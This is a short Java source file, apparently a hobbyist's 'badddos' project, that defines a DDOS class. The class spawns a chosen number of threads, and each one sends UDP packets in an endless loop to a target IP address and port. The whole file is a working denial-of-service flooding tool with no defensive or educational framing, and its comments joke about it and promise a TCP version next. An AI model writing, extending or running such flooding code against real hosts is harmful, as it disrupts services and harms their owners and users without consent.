package me.jason.badddos;

import java.io.IOException;
import java.net.*;




public class DDOS {

    String ipAddress;
    int port;
    int threads;


    public DDOS(String ip, int port, int threads) {

        this.ipAddress = ip;
        this.port = port;
        this.threads = threads;


        // REEHEHEHEHE
        for (int i = 0; i < threads; i++)
        {
            // Run threads i=x times
            new Thread(this::sendUDPPackets).start();
        }
    }


    private void sendUDPPackets() {
        while (true) {

            // I'm pretty sure this is UDP - I'll do TCP next and chuck em' both on a separate thread from main
            try {
                // Resolve hostname
                InetAddress address = InetAddress.getByName(ipAddress);

                String data = "abcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabcabc";

                // Convert data to bytes
                byte[] dataBytes = data.getBytes();

                // Create DatagramPacket
                DatagramPacket packet = new DatagramPacket(dataBytes, dataBytes.length, address, port);

                // Create and use DatagramSocket
                try (DatagramSocket socket = new DatagramSocket()) {
                    socket.send(packet);
                }
            } catch (UnknownHostException e) {
                System.out.println("Error resolving hostname: " + ipAddress);
            } catch (SocketException e) {
                System.out.println("Error creating DatagramSocket: " + e.getMessage());
            } catch (IOException e) {
                System.out.println("Error sending data: " + e.getMessage());
            }
        }
    }
}